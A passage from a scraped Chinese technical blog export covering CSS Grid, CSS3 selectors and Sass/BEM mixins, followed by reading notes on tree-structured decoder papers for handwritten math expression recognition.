fr单位分配的是可用空间而非所有空间，所以如果某一格包含的内容变多了，那么整个可用空间就会减少，可用空间是不包括那些已经确定被占用的空间的。 网格间隙 可以使用grid-column-gap和grid-row-gap来定义行间隙；也可以使用grid-gap来同时设定两者 12345.container &#123; display: grid; grid-template-columns: 2fr 1fr 1fr; grid-gap: 20px;&#125; 间隙值可以使用百分比来设置，但不能使用fr 备注：gap可以不加grid前缀使用，属于历史遗留问题，但为了代码健壮性，还是推荐加上 重复构建轨道组 当我们的列很多的时候，可以使用repeat来构建具有某些宽度的某些列： 12345.container &#123; display: grid; grid-template-columns: repeat(3, 1fr); grid-gap: 20px;&#125; 第一个值表示重复次数，第二个值表示重复构建的配置，配置可以具体多个长度例如repeat(2, 2fr,1fr)这样就会创建4个列，宽度分别为2fr 1fr 2fr 1fr 显式网格和隐式网格 显式网格是用 grid-template-columns 或 grid-template-rows 属性创建的 隐式网格则是当有内容被放到网格外时才会生成 显式网格与隐式网格的关系与弹性盒子的 main 和 cross 轴的关系有些类似。 隐式网格中生成的行/列大小是参数默认是 auto ，大小会根据放入的内容自动调整。也可以使用grid-auto-rows和grid-auto-columns属性手动设定隐式网格轨道的大小 123456.container &#123; display: grid; grid-template-columns: repeat(3, 1fr); grid-auto-rows: 100px; grid-gap: 20px;&#125; 上面的例子将grid-auto-rows设为了100px，隐式网格中的行（因为这个例子里没有设定grid-template-rows，因此，所有行都位于隐式网格内）现在都是 100 像素高了。 minmax函数 minmax 函数为一个行/列的尺寸设置了取值范围。比如设定为 minmax(100px, auto)，那么尺寸就至少为 100 像素，并且如果内容尺寸大于 100 像素则会根据内容自动调整。 123456.container &#123; display: grid; grid-template-columns: repeat(3, 1fr); grid-auto-rows: minmax(100px, auto); grid-gap: 20px;&#125; 自动使用多列填充 某些情况下，我们需要让网格自动创建很多列来填满整个容器。通过设置grid-template-columns属性，可以实现这个效果，但也可以用到 repeat 函数中的一个关键字auto-fill来替代确定的重复次数。而函数的第二个参数，使用minmax函数来设定一个行/列的最小值，以及最大值 1fr。 123456.container &#123; display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); grid-auto-rows: minmax(100px, auto); grid-gap: 20px;&#125; 基于线的元素放置 网格有许多分隔线，第一条线的起始点与文档书写模式相关。 在英文中，第一条列分隔线（即网格边缘线）在网格的最左边而第一条行分隔线在网格的最上面。 而对于阿拉伯语，第一条列分隔线在网格的最右边，因为阿拉伯文是从右往左书写的。 通过以下的属性来指定开始和结束位置 grid-column-start (en-US) grid-column-end (en-US) grid-row-start (en-US) grid-row-end (en-US) 这些属性的值均为分隔线序号，也可以用以下缩写形式来同时指定开始与结束的线。 grid-column grid-row 注意开始与结束的线的序号要使用/符号分开。 12345678910111213141516171819header &#123; grid-column: 1 / 3; grid-row: 1;&#125;article &#123; grid-column: 2; grid-row: 2;&#125;aside &#123; grid-column: 1; grid-row: 2;&#125;footer &#123; grid-column: 1 / 3; grid-row: 3;&#125; 使用grid-template-areas属性放置元素 还可以利用命名的方式，更直观的管理元素的排布： 12345678910111213141516171819202122232425.container &#123; display: grid; grid-template-areas: &quot;header header&quot; &quot;sidebar content&quot; &quot;footer footer&quot;; grid-template-columns: 1fr 3fr; gap: 20px;&#125;header &#123; grid-area: header;&#125;article &#123; grid-area: content;&#125;aside &#123; grid-area: sidebar;&#125;footer &#123; grid-area: footer;&#125; grid-template-areas属性的使用规则如下： 你需要填满网格的每个格子 对于某个横跨多个格子的元素，重复写上那个元素grid-area属性定义的区域名字 所有名字只能出现在一个连续的区域，不能在不同的位置出现 一个连续的区域必须是一个矩形 使用.符号，让一个格子留空 CSS3新特性 新增的选择器 属性选择器 input[attrname] input[attrname=&quot;val&quot;] input[attrname^=&quot;val&quot;]开头包含 input[attrname$=&quot;val&quot;]结尾包含 input[attrname*=&quot;val&quot;]包含 解构伪类选择器 E:first-child E:last-child E:nth-child(n)n可以是数字、关键字、公式 关键字有： even偶数孩子 odd奇数孩子 公式 公式中的变量n从0开始，每次加1 2n，选取偶数 2n+1，选取奇数 5n，选取5的倍数 n+5，第5个到最后一个 -n+5，前5个（包含第5个 该选择器在计算时会先计算后面的nth-child是第几个，然后看E是否和该元素匹配。计算时会将所有直系子标签全部计算顺序 E:first-of-type第一个E E:last-of-type最后一个E E:nth-of-type(n)第n个E 伪元素选择器(CSS3中使用:，CSS2中使用:) ::before ::after 该方法用于创建一个元素，该元素属于行内元素 该元素在DOM中找不到 必须包含content属性 伪元素选择器和伪类选择器权重一样wei Sass 嵌套规则 子选择器可以直接使用嵌套实现 1234567#main &#123; width: 20px; height: 20px; a &#123; color: yellow; &#125;&#125; 父级选择器 sass增加了父级选择器&amp;，可以在某个css块中访问它的父级 1234567.block &#123; width: 20px; height: 20px; &amp;:hover &#123; text-decoration: underline; &#125;&#125; 变量 使用$来定义变量 1234$width: 5em;#main &#123; width: $width;&#125; 插值语句 通过#&#123;&#125;来实现类似JS中的格式化字符串的效果 12345$name: foo;$attr: border;p.#&#123;$name&#125; &#123; #&#123;$attr&#125;-color: blue;&#125; 将编译为 123p.foo &#123; border-color: blue;&#125; @at-root 在某个块中跳出父节点，直接在根节点上创建样式 123456.parent &#123; ... @at-root .child &#123; ... &#125;&#125; 会被编译为 12.parent&#123;...&#125;.child&#123;...&#125; .child将不会被视为.parent的子选择器 整合样式的写法 css中经常会出现border这样的可以同时设置border-color border-width border-style样式的整合样式，sass中优化了这一样式的写法，可以使用&#123;&#125;将他们独立开： 1234567p &#123; border: &#123; color: blue; width: 2px; style: dashed; &#125;&#125; 编译结果为： 12345p &#123; border-color: blue; border-width: 2px; border-style: dashed;&#125; 混入 我们可以使用任何@mixin来定义一些非常常用的样式，然后当需要为其他样式添加这些样式时，使用@include插入即可 1234567891011121314@mixin large-text &#123; font: &#123; family: Arial; size: 20px; weight: bold; &#125; color: #ff0000;&#125;.page-title &#123; @include large-text; padding: 4px; margin-top: 10px;&#125; 将会编译为 12345678.page-title &#123; font-family: Arial; font-size: 20px; font-weight: bold; color: #ff0000; padding: 4px; margin-top: 10px;&#125; 此外混入块还可以接收参数 1234567891011@mixin sexy-border($color, $width) &#123; border: &#123; color: $color; width: $width; style: dashed; &#125;&#125;p &#123; @include sexy-border(blue, lin);&#125; 编译后结果为： 12345p &#123; border-color: blue; border-width: lin; border-style: dashed;&#125; @content 在引用mixin块时，我们希望在其中增加一些东西，那么就可以使用如下形式： 12345p &#123; @inlcude sexy-border(blue, 1px) &#123; background-image: url(/logo.gif); &#125;&#125; 此时需要和vue中的slot类似的，在mixin块中预留占位符，因此需要将上述的sexy-border修改为如下形式： 12345678@mixin sexy-border($color, $width) &#123; border: &#123; color: $color; width: $width; style: dashed; &#125; @content&#125; 此时p就会被编译为: 123456p &#123; border-color: blue; border-width: lin; border-style: dashed; background-image: url(/logo.gif);&#125; 使用Sass实现BEM 使用mixin可以方便的实现BEM架构的命名法则 1234567891011121314151617181920212223242526272829303132333435363738394041$namespace: &quot;ender&quot; !default;$block-sel: &quot;-&quot; !default;$elem-sel: &quot;__&quot; !default;$mod-sel: &quot;--&quot; !default;// TODO: 定义block生成模板,$block为block名@mixin b($block) &#123; // TODO: 拼接定义class名变量 $B: #&#123;$namespace + $block-sel + $block&#125;; // TODO: 初始化block .#&#123;$B&#125; &#123; @content; &#125;&#125;// TODO: 定义element生成模板,$el为element名@mixin e($el) &#123; // TODO: 获取父节点类名 $selector:&amp;; // TODO: 生成时避免生成类似 .ender-block .ender-block__el 的情况需要跳出嵌套 @at-root &#123; // TODO: 拼接定义class名变量 // 此时生成的将直接为.ender-block__el #&#123;$selector + $elem-sel + $el&#125; &#123; @content; &#125; &#125;&#125;// TODO: 定义modifier生成模板,$mod为modifier名@mixin m($mod) &#123; // TODO: 获取父节点类名 $selector:&amp;; // TODO: 生成时避免生成类似 .ender-block__el .ender-block__el--mod 的情况需要跳出嵌套 @at-root &#123; // TODO: 拼接定义class名变量 #&#123;$selector + $mod-sel + $mod&#125; &#123; @content; &#125; &#125;&#125; 将该sass文件在vite中配置为全局： 12345678910111213141516import &#123; defineConfig &#125; from &#x27;vite&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;// https://vitejs.dev/config/export default defineConfig(&#123; plugins: [vue()], // 配置sass css: &#123; preprocessorOptions: &#123; scss: &#123; additionalData: `@import &quot;./src/styles/bem.scss&quot;;` &#125; &#125; &#125;&#125;) 即可在项目中的任何style中进行这样的的元素创建： 12345678910111213141516171819&lt;template&gt; &lt;div class=&quot;ender-block&quot;&gt; Ender &lt;div class=&quot;ender-block__el&quot;&gt;description&lt;/div&gt; &lt;div class=&quot;ender-block--mod&quot;&gt;state&lt;/div&gt; &lt;/div&gt;&lt;/template&gt;&lt;style scoped lang=&quot;sass&quot;&gt;@include b(block) &#123; color: purple; @include e(el) &#123; color: blue; &#125; @include m(mod) &#123; color: red; &#125;&#125;&lt;/style&gt; 那么这些样式在编译之后将会形成如下css 123456789.ender-block &#123; color: purple;&#125;.ender-block__el &#123; color: blue;&#125;.ender-block--mod &#123; color: red;&#125;","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"CSS","slug":"前端/CSS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/CSS/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"CSS","slug":"CSS","permalink":"http://enderxiao.github.io/tags/CSS/"}]},{"title":"Tree-Decoder-for-Img2MarkUp-Generation论文阅读","slug":"Tree-Decoder-for-Img2MarkUp-Generation论文阅读","date":"2023-06-20T02:37:22.000Z","updated":"2024-07-30T11:26:33.915Z","comments":true,"path":"2023/06/20/Tree-Decoder-for-Img2MarkUp-Generation论文阅读/","permalink":"http://enderxiao.github.io/2023/06/20/Tree-Decoder-for-Img2MarkUp-Generation%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"图像到标记语言生成的树形结构解码器","text":"图像到标记语言生成的树形结构解码器 摘要 最近encoder-decoder方式主要使用序列解码器来处理图像到标记预压的生成问题。但序列解码器并不能很好的处理结构复杂度 本文通过一系列toy problems验证了树形结构解码器相对于序列解码器的优势 提出了一个树形结构解码器，每一步同时生成一个子节点和它父节点以形成一个子树。该子树以递归的方式被用于构造最终的树结构。 本实验研究的树形解码器成功的关键主要在如下2个方面： 它严格尊重树木的亲子关系 它显式地输出与线性字符串相对的树 本文分别将该解码器用在了数学公式和化学公式识别上，均取得了优于序列解码器的成果 intro 基于注意力机制的编解码器被证明在序列到序列的学习上非常有效，这些编解码器均通过基于RNN的序列解码器，使用由Encoder提取得到的特征来生成目标序列，这是因为目前应用的目标都不包含内部结构，均为一维线性文本。 尽管如此，许多研究问题自然而然地表述为文本本身的生成以及直接从图像中生成内结构关系，这些问题通常被称为标记生成问题 虽然字符串解码器可以通过生成目标树的连续化序列来处理不同的结构，但默认情况下它们并不尊重树的结构完整性。这是因为字符串解码器通常以深度优先顺序遍历的方式对结构进行序列化，而没有具体的设计考虑来确保遍历过程中固有的父子关系。 如图所示： 蓝色虚线代表序列编码器的编码顺序 蓝色实线树形编码器的编码顺序 左侧树表示的标记语言序列为A(B(CD)E) 右侧树表示的标记语言数列为A(B(CD(FG))E) 对于序列编码器而言，编码器会认为E与D节点的关系更大，但事实上E与其真正的父节点A的关系更大 那么当我们在实际任务中使用要使用模型去预测右图中序列时，模型通过左侧图片学习到的时D后更大概率出现E，于是预测D之后应该是E，然后并不是这样，D之后还有两个子节点分别为F和G 本文提出的树形编码器从两个方面控制解析顺序： 它是专门为在解码时尊重树的父子关系而设计的 它显式地生成一棵树作为最终输出。 最终的树结构有一串序列构成，其中序列的每一个元素是一个数据对（子节点，父节点） 本文的贡献由三： 提出了一种新颖的树结构解码器，该解码器尊重树结构并直接输出树，也可以在基于注意力的编码器-解码器框架内进行联合优化。 设计了一组玩具问题来说明字符串解码器失败的原因，特别是在其对更复杂结构的泛化能力方面，并反过来说明为什么在解码过程中尊重树结构会导致更好的泛化能力。 在数学公式识别和化学式识别两个实际问题上证明了所提出的树形解码器的有效性，其中标记的结构复杂性是显著的。 方法 Encoder 使用DenseNet作为Encoder Decoder 使用基于RNN的解码器，其中对于子树的生成分为两部分，分别是父节点的生成和子节点的生成，即由商议时刻的元素生成下一时刻的元素的序列生成可以转化为生成一对最合适的父子节点。 模型将首先预测出父节点，然后根据父节点预测出子节点： 训练和预测时，解码器会首先预测出N个最可能的父节点，接着根据这些父节点预测出子节点 为了保证预测的子树序列能够重建出完整的树，本文执行了两个规则： 每个子节点必须有一个父节点，因此不会出现孤立节点 父节点必须是现有的节点之一","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/categories/Transformer/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"图像处理","slug":"图像处理","permalink":"http://enderxiao.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"论文笔记","slug":"论文笔记","permalink":"http://enderxiao.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/tags/Transformer/"},{"name":"端到端","slug":"端到端","permalink":"http://enderxiao.github.io/tags/%E7%AB%AF%E5%88%B0%E7%AB%AF/"}]},{"title":"Tree-Transformer论文阅读","slug":"Tree-Transformer论文阅读","date":"2023-06-20T02:31:17.000Z","updated":"2024-07-30T11:26:33.916Z","comments":true,"path":"2023/06/20/Tree-Transformer论文阅读/","permalink":"http://enderxiao.github.io/2023/06/20/Tree-Transformer%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"基于Transformer的Tree2Tree树形解码器","text":"基于Transformer的Tree2Tree树形解码器 摘要 本文提出了一种在任意输入和输出树之间转化的新网络结构，并将其应用于源代码和自然语言领域的纠错任务中。 源代码任务上该模型取得的F0.5比最好的序列模型提升25% 在自然语言处理上取得了与最复杂的SOTA相当的结果，在CoNLL2014 benchmark上提升了10%的召回率，在AESW benchmark上的F0.5取得了50.43，达到了最高分 intro 目前大多数机器学习的方法都是以序列作为输入或输出的，但这么做通常是因为处理起来更方便，而通常为了让序列化的文本仍然包含结构信息，需要按照某一特殊文法生成序列，例如上下文无关文法(Context Free Grammar(CFG)) 本文训练了一个直接在树上操作的神经网络，教他学习底层语法的上下文信息，从而使得其可以在这样的上下文信息的指导下产生语法正确的输出。","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"树形编码器","slug":"树形编码器","permalink":"http://enderxiao.github.io/tags/%E6%A0%91%E5%BD%A2%E7%BC%96%E7%A0%81%E5%99%A8/"}]},{"title":"SS-TDNet论文阅读","slug":"SS-TD论文阅读","date":"2023-06-09T05:23:47.000Z","updated":"2024-07-30T11:26:33.914Z","comments":true,"path":"2023/06/09/SS-TD论文阅读/","permalink":"http://enderxiao.github.io/2023/06/09/SS-TD%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"本文分析了目前Tree Decoder的缺陷，并提出了一些解决方案","text":"本文分析了目前Tree Decoder的缺陷，并提出了一些解决方案 摘要 Offline HMER任务近期使用TreeDecoder进行。尽管Tree Decoder将数学表达式视为树结构，并且将2D空间结构解析到树节点上。 但目前的方法存在以下两个问题： 目前使用的方式受制于树节点预测的错误，性能仍然较差。 它们缺乏语法规则来规范表达式的输出。 本文提出了一个新的模型SS-TD，即Spatial Attention and Syntax Rule Enhanced Tree Decoder，使用了一个特殊的attention machanism来缓解树结构的预测误差，并使用语法掩码（有语法规则的变换得到）来约束不合法的数学表达式的出现 引言 最近使用Tree Decoder的方法有很多： SAN A Tree-Structured Decoder for Image-to-Markup Generation A tree structure based decoder for online handwritten mathematical expression recognition.（DenseWAP-TD） 上述文章重点介绍了HMER结构领域正在兴起。 基于树解码器的方法本质上将表达式表示为树结构，这对于HMER更自然 DenseWAP-TD这篇论文中提出，使用Tree Decoder来预测解码过程中树的父子关系。树解码器虽然显式地建模了HME的树结构，但由于只利用节点符号信息预测节点结构，结构预测精度可能会降低。 本文受到DenseWAP-TD模型的启发，提出了SS-TD模型，用于整合空间注意力和语法规则。 首先提出空间注意力机制来预测父节点，这一工作有效地提高了结构准确度。 此外，为了减少不合语法的数学表达式的产生，我们将表达式符号之间关系的语法转化为语法掩码，并将其引入关系预测过程。 本文的主要贡献如下： 提出了新的Tree Decoder（SS-TD） 提出空间注意力机制来强化节点信息预测，提出语法掩码来限制非法公式的产生 该方案在CROHME14/16/19数据集上效果不错 结论 本文论证了结合空间注意力和语法掩码的新TreeDecoder的有效性，以及该结构能够减少数学表达式的显性语法错误。 相关工作 目前的一些工作将Tree Decoder应用于各种各样的任务上。 一些研究使用树解码器对数学表达式的结构进行建模： Zhang提出的SRD模型为在线手写数学公式生成树序列表达式。 Wu提出G2G网络将该问题视为图到图的学习问题，其本质与树解码器相同。 Zhang等人提出的DenseWAP-TD它将结构树分解为子树序列来预测父子节点以及它们之间的关系 Yuan提出SAN将语法信息融入到一个编码器-解码器网络中，给了本文很多启发 现有的基于树解码器的方法试图将句法信息考虑在内，但仍不能保证输出表达式的语法准确性，为了解决这一问题，本文将注意力机制与语法规则整合到树形编码器中，来处理复杂的数学表达式，尽可能适应表达式的句法合理性 工作 本文以HME图片作为输入，输出一个三元组： (ytc,ytp,ytrel)(y_t^c, y_t^p, y_t^{rel})(ytc​,ytp​,ytrel​)分别代表子节点、父节点，以及父子节点之间的关系。 其中父节点是之前的节点y1c,...,yt−1cy_1^c,...,y_{t-1}^cy1c​,...,yt−1c​中与当前子节点ytpy_t^pytp​在语义空间信息上最匹配的节点 ytrely_t^{rel}ytrel​包含六个预测值：After、Below、Sup、Sub、Inside、Right 本文与Zhang提出的Dense-WAP使用同样的DenseNet作为Encoder 而本文的解码器包含三个预测模块： 子节点预测模块 父节点预测模块，用来预测与当前节点匹配最好的前一个子节点 关系预测模块用来预测父子节点之间的关系 预测模块最终得到一个三元组作为输出结果，最后遍历树结构得到LATEX字符串。 子节点预测模块 与之前基于树解码器的方法DenseWAP - TD一样，本文也采用父节点解码器和子节点解码器来依次识别子节点符号，如上图所示。这两个解码器生成一个包含符号及其识别顺序的元组，定义为子节点信息。 父解码器由两个GRU单元和一个注意力模块组成。 以前一个预测得到的子节点yt−1cy_{t-1}^cyt−1c​，隐状态st−1cs_{t-1}^cst−1c​作为输入，输出父上下文向量ctpc_t^pctp​及其隐状态stps_t^pstp​，这也是子解码器和另外两个模块ParentN.P和Relation.P的输入。 $ c_t^p = \\sum_{i=1}^L a_{ti}^ph_i$ $ s_t^p = GRUp_2(c_tp, \\hat{s}_t^p)$ 其中hih_ihi​是特征图E的第i个元素，L=H′×W′L = H&#x27; \\times W&#x27;L=H′×W′ stps_t^pstp​是当前父隐藏状态的预测值 atp={atip}a_t^p = \\{a_{ti}^p\\}atp​={atip​}是当前父解码器计算得到的注意力权重，计算发放如下： s^tp=GRU1p(yt−1c,st−1p)\\hat{s}_t^p = GRU_1^p(y_{t-1}^c,s_{t-1}^p)s^tp​=GRU1p​(yt−1c​,st−1p​) atp=fattp(s^tp,a1,2,...,t−1p)a_t^p = f_{att}^p(\\hat{s}^p_t,a_{1,2,...,t-1}^p)atp​=fattp​(s^tp​,a1,2,...,t−1p​) 其中fattpf_{att}^pfattp​表示一个注意力函数 子解码器的结构与父解码器一致，子解码器以上一个父节点yt−1py_{t-1}^pyt−1p​和它的隐藏状态stps_t^pstp​作为输入，输出子上下文向量ctcc_t^cctc​和它的隐状态stcs_t^cstc​ 最后使用一个全连接层和一个softmax，输入yt−1p,stc,ctcy_{t-1}^p,s_t^c,c_t^cyt−1p​,stc​,ctc​(上一个父节点，当前子节点隐状态，当前子节点特征向量)来预测当前节点的值。 p(ytc)=softmax(Woutc(Weyt−1p+Whstc+Wcctc))p(y_t^c) = softmax(W_{out}^c(W_ey_{t-1}^p + W_h s_t^c + W_c c_t^c))p(ytc​)=softmax(Woutc​(We​yt−1p​+Wh​stc​+Wc​ctc​)) 子节点预测模块的loss使用如下方式计算： Lc=−∑t=1Tlog(p(ytc))L_c = -\\sum^T_{t=1}log(p(y_t^c))Lc​=−∑t=1T​log(p(ytc​)) 基于空间注意力的父节点预测模块 本文将父节点的预测任务视为寻找与当前节点最匹配的先前生成的节点。 本文定义先前子节点的顺序为父节点的位置y^pos\\hat{y}^{pos}y^​pos 首先使用了一个MLP结构来获取语义信息因子etimeme_{ti}^{mem}etimem​，即图中MLP1MLP_1MLP1​所示的功能： etimem=vmemTtanh(Wmemstp+Umems1,2,...,t−1)ce_{ti}^{mem} = v_{mem}^Ttanh(W_{mem}s_t^p + U_{mem}s_{1,2,...,t-1})^cetimem​=vmemT​tanh(Wmem​stp​+Umem​s1,2,...,t−1​)c 其中etimeme_{ti}^{mem}etimem​表示第t步的第i个语义信息因子 stps_t^pstp​是父编码器的隐状态，s1,2,...,t−1cs_{1,2,...,t-1}^cs1,2,...,t−1c​是历史子节点的隐状态 然而，仅仅使用语义信息来预测父节点可能会导致不可避免的误差，尤其是当面对相同的表达符号时。因此，本文还引入空间注意力机制来缓解父节点的预测误差。 父节点和前一个子节点的空间信息分别表示为注意力分布atpa_t^patp​和a1，2，..，t−1ca^c_{1，2，..，t - 1}a1，2，..，t−1c​。空间能量因子的计算如下： etialpha=valphaTtanh(Walphap(atp)+Ualphap(a1,2...,t−1c))e^{alpha}_{ti} = v^T_{alpha}tanh(W_{alpha}p(a^p_t ) + U_{alpha}p(a^c_{1,2...,t−1}))etialpha​=valphaT​tanh(Walpha​p(atp​)+Ualpha​p(a1,2...,t−1c​)) 该值同样表示第t步的第i个空间信息因子 p(.)p(.)p(.)表示自适应池化,其输出向量的大小为4 × 32。 本文进一步采用门机制来控制更新的空间位置信息的输入： gt=σ(Wygyt−1c+Usgst−1c)gt = σ(W_{yg}y^c_{t−1} + U_{sg}s^c_{t−1})gt=σ(Wyg​yt−1c​+Usg​st−1c​) etiposition=etimem+gt⊙etialphae^{position}_{ti} = e^{mem}_{ti} + g_t \\odot e^{alpha}_{ti}etiposition​=etimem​+gt​⊙etialpha​ Gtiposition=σetipositionG^{position}_{ti} = σe^{position}_{ti}Gtiposition​=σetiposition​ 式中⊙\\odot⊙为元素乘积。 该模块的Loss使用交叉熵算是函数，公式如下： Lpos=−∑t−1T∑i=1L[Gˉtipositionlog(Gtiposition)+(1−Gˉtiposition)log(1−Gtiposition)]L_{pos} = -\\sum_{t-1}^T \\sum_{i=1}^L[\\bar{G}_{ti}^{position}log(G_{ti}^{position}) + (1 - \\bar{G}_{ti}^{position})log(1 - G_{ti}^{position})]Lpos​=−∑t−1T​∑i=1L​[Gˉtiposition​log(Gtiposition​)+(1−Gˉtiposition​)log(1−Gtiposition​)] 其中Gˉtiposition\\bar{G}_{ti}^{position}Gˉtiposition​表示父节点的真标签，如果第i个历史子节点是当前节点的父节点，那么Gˉtiposition\\bar{G}_{ti}^{position}Gˉtiposition​值为1，否则为0 预测时则直接取最大值： y^pos=arg⁡max⁡ Gpositiong\\hat{y}^{pos} = \\underset{g}{ \\arg \\max \\, G^{position}}y^​pos=gargmaxGposition​ 随后使用表示子节点序列的向量y^pos\\hat{y}^{pos}y^​pos得到父节点的预测y^p\\hat{y}^py^​p 随后本文将父节点信息y^pos\\hat{y}^{pos}y^​pos输入子解码器来预测子节点。 基于语法规则的关系预测 本文在关系预测模块中引入了语法规则，规则如下： 不同的数学符号有不同的连接关系限制，比如∑\\sum∑不能与其他符号有’ Inside '关系。 每个数学符号不能同时存在重复的连接关系，就像一个符号不能与另外两个符号存在&quot;Right&quot;的关系一样 对于第一条规则，本文为了将语法规则结合到训练过程中，提出了用于表示数学连接关系的语法掩码。即如果两个数学符号能够以Right、Sup、Sub、Above、Below、Inside的关系表示，则对应位置掩码值为1，否则为0. 静态语法掩码如下： 这些掩码会被作为先验知识输入。作者将字符根据掩码分类来减少先验知识的数量，同时，对于具有多种可能的字符，可以直接使用逻辑或操作将每种可能的掩码进行处理。例如字符e，当它为小写字母变时，掩码为111000，而当它作为自然底数的时候，掩码为110000，那么字符e最后的掩码为111000∣∣110000=111000111000||110000 = 111000111000∣∣110000=111000 本文使用一个掩码矩阵Rstatic∈RC×6R_{static} \\in R^{C \\times 6}Rstatic​∈RC×6来表示，父节点的静态掩码矩阵即为mts∈R6m_t^s \\in R^6mts​∈R6： mts=ytpRstaticm_t^s = y_t^p R_{static}mts​=ytp​Rstatic​ ytpy_t^pytp​是当前父节点的独热向量 对于第条规则，模型需要获取到父子节点之间关系的历史信息。本文提出来一个动态掩码矩阵RdynamictR_{dynamic}^tRdynamict​，它被初始化为一个全零矩阵来存储t步中的历史关系。例如，当父节点及其关系被预测为’ \\ sqrt ‘和’ Inside ‘时，RdynamictR_{dynamic}^tRdynamict​中’ \\ sqrt ‘对应行和’ Inside ‘对应列的值应更新为’ 1 '。父节点的动态语法掩码表示为mtd∈R6m_t^d \\in R^6mtd​∈R6: mtd=ytpRdynamict−1m_t^d = y_t^p R_{dynamic}^{t-1}mtd​=ytp​Rdynamict−1​ mt=mts⊗mtdm_t = m_t^s \\otimes m_t^dmt​=mts​⊗mtd​ 其中⊗\\otimes⊗表示逻辑异或运算 动态掩码矩阵的更新计算如下： Rdynamict=Rdynamict−1+ytpTytrelR_{dynamic}^t = R_{dynamic}^{t-1} + y_t^{p^T}y_t^{rel}Rdynamict​=Rdynamict−1​+ytpT​ytrel​ 其中ytpTy_t^{p^T}ytpT​表示父节点ytpy_t^{p}ytp​d的转置 最终预测位置关系的公式如下： p(yrrel)=softmax(mt⊙(Woutrel(Wcpctp+WccCtc)))p(y_r^{rel}) = softmax(m_t \\odot (W_{out}^{rel}(W_{cp}c_t^p + W_{cc}C_t^c)))p(yrrel​)=softmax(mt​⊙(Woutrel​(Wcp​ctp​+Wcc​Ctc​))) 其中⊙\\odot⊙代表逐元素乘 分类误差计算如下所示： Lrel=−∑t=1Tlog(p(ytrel))L_{rel} = -\\sum_{t=1}^T log(p(y_t^{rel}))Lrel​=−∑t=1T​log(p(ytrel​)) 预测阶段的任务我们可以用以下方程表示： y^rel=arg⁡max⁡ p(ytrel)yrel\\hat{y}^{rel} = \\underset{y^{rel}}{\\arg \\max\\, p(y_t^{rel})}y^​rel=yrelargmaxp(ytrel​)​ 损失计算 本文使用一个注意力自正则化损失来加速网络收敛。具体来说，采用KL散度来衡量父子解码器产生的注意力分布差异： Lalpha=∑t=1Ta^tplog(a^tpatp)L_{alpha} = \\sum_{t=1}^{T} \\hat{a}_t^p log(\\frac{\\hat{a}_t^p}{a_t^p})Lalpha​=∑t=1T​a^tp​log(atp​a^tp​​) 因此最终得到的目标损失函数如下： L=λ1Lc+λ2Lpos+λ3Lrel+λ4LalphaL = \\lambda _1 L_c + \\lambda _2 L_{pos} + \\lambda _3 L_{rel} + \\lambda_4 L_{alpha}L=λ1​Lc​+λ2​Lpos​+λ3​Lrel​+λ4​Lalpha​ 其中λ\\lambdaλ是每个项目的权重 实验 实验配置 对于训练Loss，权重λ1=λ2=λ3=1,λ4=0.1\\lambda_1 = \\lambda_2 = \\lambda_3 = 1, \\lambda_4 = 0.1λ1​=λ2​=λ3​=1,λ4​=0.1 本文使用的Encoder为DenseNet，包含三个Dense块和两个Transition层，每一个Dense块均包含48个卷积层，卷积核大小为11*11 模型在一台两张3090的设备上进行 使用的数据集是CROHME14/16/19 本文对DenseWAP-TD模型进行了简化，将子注意力和父注意力以及记忆注意力的embedding维度由512更改为了128 消融实验 消融实验仅在CROHME14上进行 本文对空间信息、静态语义掩码、动态语义掩码分别进行了消融实验，第一项表示树结构的表达式准确率，第二项表示表达式准确率，第三项表示父节点的预测错误率，最后一项表示父子节点关系的预测错误率。 上表论证了影响识别正确率的是空间注意力机制而不是注意力权重。 本文也比较了不适用注意和使用注意力的情况，使用注意力时计算 precision(%)Params(M)\\frac{precision(\\%)}{Params(M)}Params(M)precision(%)​ 得到的值为10.79，比没有使用注意力得到的值多了0.12 如下图所示 当仅使用语义信息预测时得到了错误的结果1 在整合了空间信息之后，能够正确地预测到父节点是n 最后本模型与其余模型对比结果如下： 本文提出的模型仍然低于一些字符串编码器，例如 Truong, T., Ung, H.Q., Nguyen, H.T., Nguyen, 